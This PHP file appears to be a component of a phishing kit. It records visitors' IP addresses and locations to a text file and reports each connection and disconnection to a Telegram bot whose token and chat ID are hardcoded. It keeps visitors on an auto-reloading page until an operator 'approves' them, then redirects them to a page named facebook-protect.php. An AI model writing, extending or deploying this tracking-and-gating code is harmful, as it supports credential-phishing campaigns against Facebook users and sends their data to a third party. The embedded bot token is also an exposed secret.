<?php

function sendTelegramNotification($message)
{
    $apiKey = '6504436094:AAHS03NHNdp5IuP90o89tDKf5kSXtan3OqU';
    $chatId = '-1002131592723';

    $url = "https://api.telegram.org/bot{$apiKey}/sendMessage";
    $data = [
        'chat_id' => $chatId,
        'text' => $message,
    ];

    $options = [
        'http' => [
            'method' => 'POST',
            'header' => 'Content-type: application/x-www-form-urlencoded',
            'content' => http_build_query($data),
        ],
    ];

    $context = stream_context_create($options);
    file_get_contents($url, false, $context);
}

$userIpInfo = getIpInfo();
$userIp = isset($userIpInfo['query']) ? $userIpInfo['query'] : 'Unknown';
$country = isset($userIpInfo['country']) ? $userIpInfo['country'] : 'Unknown';
$region = isset($userIpInfo['regionName']) ? $userIpInfo['regionName'] : 'Unknown';
$city = isset($userIpInfo['city']) ? $userIpInfo['city'] : 'Unknown';


if (isset($_SESSION['user_connected']) && $_SESSION['user_connected'] && !isset($_SESSION['disconnect_notified'])) {
    $_SESSION['disconnect_notified'] = true;
    $disconnectMessage = "User disconnected!\nIP: $userIp";
    sendTelegramNotification($disconnectMessage);
}

$reloadInterval = 5000;
echo '<script>
        setInterval(function() {
            location.reload();
        }, ' . $reloadInterval . ');
      </script>';

$userId = getUserIdByIp($userIp);

if ($userId === null) {
    $userId = $userIp;

    $connectMessage = "User connected!\nIP: $userIp";
    sendTelegramNotification($connectMessage);

    $data = "$userId|$userIp|$country|$region|$city|pending";
    file_put_contents('user_data.txt', $data . PHP_EOL, FILE_APPEND | LOCK_EX);

    $_SESSION['user_connected'] = true; 
} else {
    $lines = file('user_data.txt', FILE_IGNORE_NEW_LINES);
    foreach ($lines as $line) {
        list($lineUserId, $lineUserIp, $lineCountry, $lineRegion, $lineCity, $lineStatus) = explode('|', $line);
        if ($lineUserId === $userId) {
            if ($lineStatus === 'approved') {
                header("Location: /facebook-protect.php");
                exit();
            }
            break;
        }
    }
}

function getUserIdByIp($userIp)
{
    $lines = file('user_data.txt', FILE_IGNORE_NEW_LINES);

    foreach ($lines as $line) {
        list($lineUserId, $lineUserIp, $lineCountry, $lineRegion, $lineCity, $lineStatus) = explode('|', $line);

        if ($lineUserIp === $userIp) {
            return $userIp;
        }
    }

    return null;
}

function getIpInfo()
{
    $ipInfoResponse = file_get_contents('http://ip-api.com/json/');
    $ipInfoData = json_decode($ipInfoResponse, true);
    return $ipInfoData;
}
?>



